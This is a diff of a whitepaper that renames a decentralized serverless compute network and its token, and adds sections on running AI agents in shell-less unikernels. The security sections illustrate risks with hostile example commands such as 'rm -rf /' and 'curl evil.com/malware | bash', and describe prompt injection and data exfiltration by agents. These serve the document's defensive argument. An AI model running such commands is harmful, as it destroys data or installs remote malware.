@@ -1,4 +1,4 @@
-# Talos Network
+# Graphene Network
 
 **A Zero-Latency Decentralized Serverless Platform**
 
@@ -9,15 +9,17 @@ February 2026
 
 ## Abstract
 
-Talos is a decentralized compute network optimized for ephemeral serverless functions and AI inference. By combining **Unikraft unikernels** with **Firecracker MicroVMs**, Talos achieves sub-second cold starts with hardware-level isolation. The network uses **Solana** for settlement, **Iroh** for peer-to-peer data transfer, and **off-chain payment channels** for zero-latency job execution.
+Graphene is a decentralized compute network optimized for **AI agent execution** and ephemeral serverless functions. By combining **Unikraft unikernels** with **Firecracker MicroVMs**, Graphene achieves sub-second cold starts with hardware-level isolation — without giving AI agents dangerous shell access.
 
-Unlike traditional DePIN compute networks that suffer from Docker image bloat and blockchain consensus delays, Talos delivers performance comparable to AWS Lambda while maintaining a permissionless, trustless architecture.
+The network uses **Solana** for settlement, **Iroh** for peer-to-peer data transfer, and **off-chain payment channels** for zero-latency job execution.
+
+Unlike traditional approaches that give AI agents shell access inside containers (creating massive security risks), Graphene enforces a **Planner/Executor separation**: AI agents generate code manifests, which are compiled into sealed single-purpose unikernels with no shell, no package manager, and no arbitrary network access. This solves the "Agentic Dependency Problem" — enabling autonomous AI agents to execute code safely without the ability to install malware, exfiltrate data, or cause system-wide damage.
 
 ---
 
 ## 1. The Problem
 
-Current decentralized compute networks face three structural bottlenecks:
+Current decentralized compute networks face four structural bottlenecks:
 
 ### 1.1 The Container Bottleneck
 Shipping gigabyte-sized Docker images for every job creates unacceptable latency. A typical serverless cold start on existing DePIN networks takes 30-120 seconds.
@@ -28,11 +30,21 @@ Waiting for blockchain finality before starting execution destroys real-time use
 ### 1.3 The Gas Friction
 Requiring users to hold native gas tokens and sign transactions for every job ruins the developer experience and creates unnecessary barriers to adoption.
 
+### 1.4 The AI Agent Security Crisis
+Current "agentic" AI solutions treat AI agents like human users — giving them shell access inside containers. This is fundamentally dangerous:
+
+- If an AI hallucinates, it can run `rm -rf /` or `curl malware.com | bash`
+- Prompt injection attacks can trick agents into executing malicious code
+- Supply chain attacks via compromised packages affect the entire system
+- Agents can exfiltrate data through unrestricted network egress
+
+**The shell is the wrong abstraction for AI agents.** They need to execute code, not operate environments.
+
 ---
 
-## 2. The Talos Solution
+## 2. The Graphene Solution
 
-Talos decouples **work** from **settlement**:
+Graphene decouples **work** from **settlement**:
 
 - **Work** happens instantly over a P2P network
 - **Payment** happens instantly via cryptographic tickets
@@ -46,12 +58,13 @@ Talos decouples **work** from **settlement**:
 | **Content-Addressable Caching** | 99% cache hit rate for common stacks |
 | **Payment Channels** | Zero blockchain latency per job |
 | **Ephemeral Builder VMs** | Secure builds without trusting user code |
+| **No-Shell Agent Execution** | AI agents cannot run arbitrary commands |
 
 ---
 
 ## 3. Architecture
 
-The Talos stack consists of four layers, all implemented in Rust.
+The Graphene stack consists of four layers, all implemented in Rust.
 
 ```
 ┌─────────────────────────────────────────────────────────┐
@@ -88,7 +101,7 @@ The Talos stack consists of four layers, all implemented in Rust.
 
 ### 3.1 Layer 1: Settlement Plane (Solana)
 
-Solana serves as the financial backbone. The Talos Anchor program handles:
+Solana serves as the financial backbone. The Graphene Anchor program handles:
 
 - **Payment Channels**: Users lock funds in PDAs (Program Derived Addresses)
 - **Worker Registry**: Staked workers with advertised capabilities
@@ -139,7 +152,7 @@ For popular stacks (Python + Pandas, Node + Express), cold start approaches the 
 
 Iroh provides the peer-to-peer networking layer:
 
-- **Gossip Protocol**: Workers announce availability on `talos-compute-v1` topic
+- **Gossip Protocol**: Workers announce availability on `graphene-compute-v1` topic
 - **Magicsock**: NAT traversal via UDP hole-punching and DERP relays
 - **QUIC Multiplexing**: Concurrent streams for tickets, code, and results
 - **Content-Addressed Blobs**: Verified chunk-by-chunk transfer
@@ -557,38 +570,38 @@ Anchor program verifies signature via Ed25519 introspection and transfers funds.
 
 ## 5. Tokenomics
 
-### 5.1 The $TALOS Token
+### 5.1 The $GRAPHENE Token
 
-$TALOS is an SPL token with two primary functions:
+$GRAPHENE is an SPL token with two primary functions:
 
 **1. Worker Staking (Security)**
-Workers must stake $TALOS proportional to their advertised compute:
+Workers must stake $GRAPHENE proportional to their advertised compute:
 
 | Resource | Stake Required |
 |----------|----------------|
-| Base | 100 $TALOS |
-| Per vCPU | 50 $TALOS |
-| Per GB RAM | 10 $TALOS |
-| Per GPU | 500 $TALOS |
+| Base | 100 $GRAPHENE |
+| Per vCPU | 50 $GRAPHENE |
+| Per GB RAM | 10 $GRAPHENE |
+| Per GPU | 500 $GRAPHENE |
 
-Example: 8 vCPU, 32GB RAM node requires 820 $TALOS stake.
+Example: 8 vCPU, 32GB RAM node requires 820 $GRAPHENE stake.
 
 **2. Payment Medium (Optional)**
-Users can pay in USDC or $TALOS. Paying in $TALOS provides a 15% discount, creating organic demand without forcing adoption.
+Users can pay in USDC or $GRAPHENE. Paying in $GRAPHENE provides a 15% discount, creating organic demand without forcing adoption.
 
 ### 5.2 Payment Flow
 
 | Actor | Token Requirement |
 |-------|-------------------|
-| Workers | Must stake $TALOS |
-| Users | Can pay in USDC or $TALOS |
+| Workers | Must stake $GRAPHENE |
+| Users | Can pay in USDC or $GRAPHENE |
 | Settlement | Workers pay SOL gas fees |
 
 Users never need to hold SOL. Workers absorb gas costs (profitable given job revenue).
 
 ### 5.3 Token Supply
 
-**Max Supply:** 1,000,000,000 $TALOS (1 billion, fixed cap)
+**Max Supply:** 1,000,000,000 $GRAPHENE (1 billion, fixed cap)
 
 **Initial Distribution:**
 
@@ -602,7 +615,7 @@ Users never need to hold SOL. Workers absorb gas costs (profitable given job rev
 
 ```
 ┌─────────────────────────────────────────────────────────┐
-│                    1B $TALOS                            │
+│                    1B $GRAPHENE                            │
 ├──────────────────────┬──────────────────────────────────┤
 │   Community (40%)    │████████████████████              │
 ├──────────────────────┼──────────────────────────────────┤
@@ -630,13 +643,13 @@ New tokens enter circulation through **Worker Rewards** — incentivizing early 
 | 4 | 2% of max | 20M | 200M |
 | 5+ | 1% of max | 10M/year | Capped at 300M total emissions |
 
-**Total emission cap:** 300M $TALOS (30% of max supply)
+**Total emission cap:** 300M $GRAPHENE (30% of max supply)
 
 After year 5, emissions continue at 1% until the 300M cap is reached (~Year 12), then emissions stop entirely. Network sustainability relies on fee revenue.
 
 ### 5.5 Staking Economics
 
-Workers stake $TALOS to participate. Staking yield comes from two sources:
+Workers stake $GRAPHENE to participate. Staking yield comes from two sources:
 
 **Source 1: Protocol Emissions (decreasing over time)**
 - Distributed pro-rata to staked workers
@@ -669,9 +682,9 @@ Workers stake $TALOS to participate. Staking yield comes from two sources:
 
 | Scenario | Total Staked | Network Revenue | Estimated APY |
 |----------|--------------|-----------------|---------------|
-| Early (Year 1) | 50M $TALOS | $1M/year | 15-25% |
-| Growth (Year 2-3) | 150M $TALOS | $10M/year | 10-15% |
-| Mature (Year 5+) | 300M $TALOS | $50M/year | 8-12% |
+| Early (Year 1) | 50M $GRAPHENE | $1M/year | 15-25% |
+| Growth (Year 2-3) | 150M $GRAPHENE | $10M/year | 10-15% |
+| Mature (Year 5+) | 300M $GRAPHENE | $50M/year | 8-12% |
 
 *APY varies based on stake participation and network revenue.*
 
@@ -682,7 +695,7 @@ Workers stake $TALOS to participate. Staking yield comes from two sources:
 | Payment Method | Protocol Fee | Worker Receives |
 |----------------|--------------|-----------------|
 | USDC | 5% | 95% |
-| $TALOS | 2% | 98% (15% effective discount) |
+| $GRAPHENE | 2% | 98% (15% effective discount) |
 
 **Fee Distribution:**
 
@@ -706,7 +719,7 @@ Multiple mechanisms reduce circulating supply:
 
 **1. Fee Burns**
 - 20% of protocol fees burned permanently
-- At $50M annual revenue: ~$1M worth of $TALOS burned/year
+- At $50M annual revenue: ~$1M worth of $GRAPHENE burned/year
 
 **2. Slashing Burns**
 - 50% of slashed stake is burned (rest goes to affected users)
@@ -723,8 +736,8 @@ At sufficient network revenue, burns exceed emissions:
 
 ```
 Break-even calculation:
-- Year 5 emissions: 10M $TALOS
-- Required burns to offset: 10M $TALOS
+- Year 5 emissions: 10M $GRAPHENE
+- Required burns to offset: 10M $GRAPHENE
 - At 20% burn rate: need $50M protocol fees
 - At 10% protocol take: need $500M job volume
 
@@ -740,7 +753,7 @@ Network becomes net-deflationary at ~$500M annual job volume.
                                      │
                          ┌───────────┴───────────┐
                          │                       │
-                    Pay USDC                Pay $TALOS
+                    Pay USDC                Pay $GRAPHENE
                     (5% fee)                (2% fee)
                          │                       │
                          ▼                       ▼
@@ -758,7 +771,7 @@ Network becomes net-deflationary at ~$500M annual job volume.
                   │ WORKERS  │     │    PROTOCOL FEE     │
                   └────┬─────┘     └──────────┬──────────┘
                        │                      │
-                  Stake $TALOS        ┌───────┼───────┐
+                  Stake $GRAPHENE        ┌───────┼───────┐
                        │              │       │       │
                        ▼              ▼       ▼       ▼
               ┌──────────────┐    Stakers  Treasury  Burn
@@ -792,7 +805,7 @@ Network becomes net-deflationary at ~$500M annual job volume.
 ### 5.10 Worker Economics Example
 
 **Setup:**
-- Worker stakes 1,000 $TALOS (~$1,000 at $1/token)
+- Worker stakes 1,000 $GRAPHENE (~$1,000 at $1/token)
 - Provides 8 vCPU, 32GB RAM
 - 50% utilization rate
 
@@ -856,7 +869,225 @@ Workers advertise supported tiers. Compute tier requires higher stake.
 
 ## 7. Security
 
-### 7.1 Triple-Layer Isolation
+### 7.1 The AI Agent Security Problem
+
+Current "agentic" AI solutions treat the AI like a human user — giving it shell access (`/bin/bash`) inside a container or VM. This is fundamentally broken:
+
+**The Problem:**
+```
+┌─────────────────────────────────────────────────────────────┐
+│                     DANGEROUS: Shell-Based Agent            │
+├─────────────────────────────────────────────────────────────┤
+│                                                             │
+│   User: "Analyze this CSV and plot a graph"                 │
+│                         │                                   │
+│                         ▼                                   │
+│   ┌─────────────────────────────────────────────┐           │
+│   │              AI AGENT                        │           │
+│   │  "I'll install pandas and matplotlib..."    │           │
+│   └─────────────────────┬───────────────────────┘           │
+│                         │                                   │
+│                         ▼                                   │
+│   ┌─────────────────────────────────────────────┐           │
+│   │         CONTAINER / VM WITH SHELL           │           │
+│   │                                             │           │
+│   │   $ pip install pandas matplotlib    ✓     │           │
+│   │   $ python analyze.py                ✓     │           │
+│   │   $ curl evil.com/malware | bash     ✗ !!  │  ← RISK   │
+│   │   $ rm -rf /                         ✗ !!  │  ← RISK   │
+│   │                                             │           │
+│   └─────────────────────────────────────────────┘           │
+│                                                             │
+│   If the AI hallucinates or is prompt-injected,             │
+│   it has all the tools to cause havoc.                      │
+│                                                             │
+└─────────────────────────────────────────────────────────────┘
+```
+
+**Attack vectors in shell-based agents:**
+- AI hallucinates malicious commands
+- Prompt injection tricks AI into running exploits
+- Supply chain attacks via compromised packages
+- Lateral movement through network access
+- Data exfiltration via unrestricted egress
+
+### 7.2 The Graphene Solution: Function Sandboxing
+
+Graphene moves from **"Sandboxing an Environment"** to **"Sandboxing a Function"**.
+
+The AI agent does not "run" inside a runtime. It *requests* a build, and the system executes a sealed, single-purpose unikernel.
+
+**The Solution:**
+```
+┌─────────────────────────────────────────────────────────────┐
+│                      SAFE: Manifest-Based Agent             │
+├─────────────────────────────────────────────────────────────┤
+│                                                             │
+│   User: "Analyze this CSV and plot a graph"                 │
+│                         │                                   │
+│                         ▼                                   │
+│   ┌─────────────────────────────────────────────┐           │
+│   │              AI AGENT (Planner)              │           │
+│   │                                             │           │
+│   │  Generates:                                 │           │
+│   │  • Dockerfile (code + deps)                 │           │
+│   │  • manifest.json (resources, egress list)   │           │
+│   │                                             │           │
+│   │  ┌────────────────────────────────────┐     │           │
+│   │  │ FROM python:3.11-slim-unikraft     │     │           │
+│   │  │ COPY analyze.py /app/              │     │           │
+│   │  │ RUN pip install pandas matplotlib  │     │           │
+│   │  │ CMD ["python", "/app/analyze.py"]  │     │           │
+│   │  └────────────────────────────────────┘     │           │
+│   │                                             │           │
+│   │  ⚠️  NO SHELL ACCESS                        │           │
+│   │  ⚠️  NO NETWORK ACCESS                      │           │
+│   │  ⚠️  NO RUNTIME ENVIRONMENT                 │           │
+│   └─────────────────────┬───────────────────────┘           │
+│                         │                                   │
+│              Submit Dockerfile + Manifest + Ticket          │
+│                         │                                   │
+│                         ▼                                   │
+│   ┌─────────────────────────────────────────────┐           │
+│   │         GRAPHENE WORKER (Ephemeral Builder)    │           │
+│   │                                             │           │
+│   │  1. Spawn isolated Builder VM               │           │
+│   │  2. Run BuildKit + Unikraft toolchain       │           │
+│   │  3. Compile Dockerfile → .unik binary       │           │
+│   │  4. Destroy Builder VM                      │           │
+│   │  5. Boot production MicroVM with .unik      │           │
+│   └─────────────────────┬───────────────────────┘           │
+│                         │                                   │
+│                         ▼                                   │
+│   ┌─────────────────────────────────────────────┐           │
+│   │              UNIKERNEL EXECUTION            │           │
+│   │                                             │           │
+│   │  • NO /bin/bash         (doesn't exist)    │           │
+│   │  • NO pip/apt           (doesn't exist)    │           │
+│   │  • NO process spawning  (single process)   │           │
+│   │  • NO arbitrary egress  (allowlist only)   │           │
+│   │                                             │           │
+│   │  Can ONLY: Run analyze.py → Output result   │           │
+│   └─────────────────────────────────────────────┘           │
+│                                                             │
+└─────────────────────────────────────────────────────────────┘
+```
+
+**Key insight:** The `RUN pip install` in the Dockerfile executes *inside the ephemeral builder VM*, not on the host. Even if the AI writes malicious RUN commands, they're sandboxed in a disposable VM that has no access to host keys, files, or network.
+
+### 7.3 Agent Architecture: Planner vs Executor
+
+Graphene enforces a strict separation between the **Planner** (AI) and **Executor** (Runtime):
+
+| Layer | Role | Has Shell? | Has Network? | Can Install? |
+|-------|------|------------|--------------|--------------|
+| **Planner (AI)** | Generate Dockerfile + manifest | No | No | No |
+| **Builder VM** | Run BuildKit + Unikraft | Isolated | Mirror only | Build-time only |
+| **Executor** | Run sealed .unik binary | No | Allowlist only | No |
+
+**The AI never touches the runtime.** It only produces a Dockerfile that is compiled by an isolated, ephemeral builder VM. The builder VM:
+- Has no access to host keys, files, or network
+- Is destroyed immediately after producing the .unik binary
+- Cannot persist any state or communicate externally
+
+Even if the AI writes `RUN curl evil.com | bash` in the Dockerfile, that command runs inside the disposable builder — not on the host or production runtime.
+
+### 7.4 Why Unikernels Solve This
+
+Traditional containers share a kernel with the host and include full OS userland:
+
+```
+Container:          Unikernel:
+┌─────────────┐     ┌─────────────┐
+│ App         │     │ App         │
+├─────────────┤     ├─────────────┤
+│ Libraries   │     │ Libraries   │
+├─────────────┤     │ (linked)    │
+│ /bin/bash   │     ├─────────────┤
+│ /usr/bin/*  │     │ Minimal     │
+│ apt/pip     │     │ Kernel      │
+├─────────────┤     │ (no shell)  │
+│ Linux       │     └─────────────┘
+│ (shared)    │           │
+└─────────────┘           │
+      │                   │
+      ▼                   ▼
+┌─────────────┐     ┌─────────────┐
+│ Host Kernel │     │ Hypervisor  │
+│ (shared!)   │     │ (isolated)  │
+└─────────────┘     └─────────────┘
+```
+
+**Unikernel properties:**
+- **No shell**: `/bin/bash` doesn't exist, so `exec()` attacks fail
+- **No package manager**: `pip install` at runtime is impossible
+- **Single process**: No ability to fork or spawn processes
+- **No syscall surface**: Only syscalls needed for the app are compiled in
+- **Hypervisor isolation**: Even kernel exploits don't reach the host
+
+### 7.5 Supply Chain Security
+
+AI agents often request packages that could be compromised. Graphene mitigates this:
+
+**1. Approved Package Mirrors**
+Workers maintain mirrors of common packages (PyPI, npm) that are:
+- Scanned for known vulnerabilities
+- Signed by package maintainers
+- Cached with content-addressing
+
+**2. Dependency Pinning**
+Manifests require exact versions and hashes:
+```json
+{
+  "requirements": {
+    "pandas": { "version": "2.1.0", "hash": "sha256:abc..." },
+    "numpy": { "version": "1.26.0", "hash": "sha256:def..." }
+  }
+}
+```
+
+**3. Build Reproducibility**
+Given identical inputs, builds produce identical outputs:
+```
+build(code + deps + kernel) → deterministic hash
+```
+
+Any tampering is detectable by hash mismatch.
+
+### 7.6 Network Egress Controls
+
+The manifest specifies an **allowlist** of permitted endpoints:
+
+```json
+{
+  "network": {
+    "egress_allowlist": [
+      "api.openai.com",
+      "storage.googleapis.com"
+    ]
+  }
+}
+```
+
+**Enforcement:**
+- Unikernel's network stack only permits connections to allowlisted hosts
+- DNS resolution restricted to allowlist
+- No arbitrary outbound connections possible
+- Data exfiltration prevented at the hypervisor level
+
+### 7.7 Comparison: Shell-Based vs Graphene
+
+| Capability | Shell-Based Agent | Graphene Agent |
+|------------|-------------------|-------------|
+| Run arbitrary commands | Yes (dangerous) | No |
+| Install packages at runtime | Yes (supply chain risk) | No (build-time only) |
+| Access host filesystem | Possible (escape risk) | No (hypervisor isolated) |
+| Arbitrary network egress | Yes (exfil risk) | No (allowlist only) |
+| Spawn processes | Yes | No (single process) |
+| Survive reboot | Yes (persistence) | No (ephemeral) |
+| Attack surface | Full OS userland | Single binary |
+
+### 7.8 Triple-Layer Isolation
 
 | Layer | Component | Protection |
 |-------|-----------|------------|
@@ -864,7 +1095,7 @@ Workers advertise supported tiers. Compute tier requires higher stake.
 | Storage | Content Addressing | Prevents poisoned image attacks |
 | Runtime | KVM Virtualization | Prevents guest-to-host escape |
 
-### 7.2 Slashing Conditions
+### 7.9 Slashing Conditions
 
 Workers are slashed only for **observable misbehavior**:
 
@@ -878,11 +1109,11 @@ Workers are slashed only for **observable misbehavior**:
 - Incorrect results (handled by reputation)
 - Data exfiltration (mitigated by network allowlist)
 
-### 7.3 Unbonding Period
+### 7.10 Unbonding Period
 
 Workers requesting stake withdrawal enter a 14-day unbonding period. This prevents "slash and run" attacks and allows time for fraud proofs.
 
-### 7.4 Future: Confidential Compute
+### 7.11 Future: Confidential Compute
 
 TEE integration (Intel SGX / AMD SEV) planned as premium tier for:
 - Proprietary AI model inference
@@ -957,7 +1188,7 @@ Results are stored as Iroh blobs with 24-hour TTL:
 
 ## 10. Job Orchestration
 
-Talos supports composing multiple jobs into workflows, enabling pipelines, fan-out parallelism, and conditional execution.
+Graphene supports composing multiple jobs into workflows, enabling pipelines, fan-out parallelism, and conditional execution.
 
 ### 10.1 Orchestration Modes
 
@@ -1024,8 +1255,8 @@ The worker pipelines dependency loading with execution, minimizing total latency
 When workflow shape depends on runtime decisions, jobs can spawn children programmatically:
 
 ```python
-# Inside a Talos job
-from talos import spawn, fan_out
+# Inside a Graphene job
+from graphene import spawn, fan_out
 
 # Sequential spawn
 result = spawn(
@@ -1188,7 +1419,7 @@ Distributed:     Job A ──[iroh blob]──▶ Job B  (network latency)
 
 ### 11.1 Discovery
 
-All workers subscribe to `talos-compute-v1` gossip topic. Announcements include:
+All workers subscribe to `graphene-compute-v1` gossip topic. Announcements include:
 - Node ID (Ed25519 public key)
 - Capabilities (vCPU, RAM, GPU, regions)
 - Pricing
@@ -1218,7 +1449,7 @@ Dependency blobs are content-addressed and shared peer-to-peer:
                          │                │
                          └───────┬────────┘
                                  │
-                                 │ Stake $TALOS on Solana
+                                 │ Stake $GRAPHENE on Solana
                                  ▼
                          ┌────────────────┐
                          │                │
@@ -1311,7 +1542,7 @@ Dependency blobs are content-addressed and shared peer-to-peer:
 
 ### Phase 3: Launch (Q3 2026)
 - Anchor program audit
-- $TALOS token generation
+- $GRAPHENE token generation
 - Mainnet launch
 - SDK release (Python, TypeScript, Rust)
 
@@ -1337,13 +1568,16 @@ Dependency blobs are content-addressed and shared peer-to-peer:
 
 ## 14. Comparison
 
-| Feature | AWS Lambda | Akash | Talos |
+| Feature | AWS Lambda | Akash | Graphene |
 |---------|------------|-------|-------|
 | Cold Start | 100-500ms | 30-120s | 200-500ms |
-| Isolation | Container | Container | MicroVM |
-| Payment | Credit Card | $AKT | USDC / $TALOS |
+| Isolation | Container | Container | MicroVM + Unikernel |
+| Payment | Credit Card | $AKT | USDC / $GRAPHENE |
 | Latency | Centralized | On-chain | Off-chain |
 | Permissionless | No | Yes | Yes |
+| AI Agent Shell Access | Yes (risky) | Yes (risky) | **No (safe)** |
+| Runtime Package Install | Yes | Yes | No (build-time only) |
+| Network Egress | Unrestricted | Unrestricted | Allowlist only |
 
 ---
 
@@ -1351,7 +1585,7 @@ Dependency blobs are content-addressed and shared peer-to-peer:
 
 ```json
 {
-  "$schema": "https://talos.network/schemas/manifest-v1.json",
+  "$schema": "https://graphene.network/schemas/manifest-v1.json",
   "version": "1.0",
   "kernel": "python-3.11-unikraft",
   "entrypoint": "main.py",
@@ -1469,5 +1703,5 @@ Dependency blobs are content-addressed and shared peer-to-peer:
 
 ---
 
-*For technical questions: developers@talos.network*
-*For partnerships: partners@talos.network*
+*For technical questions: developers@graphene.network*
+*For partnerships: partners@graphene.network*
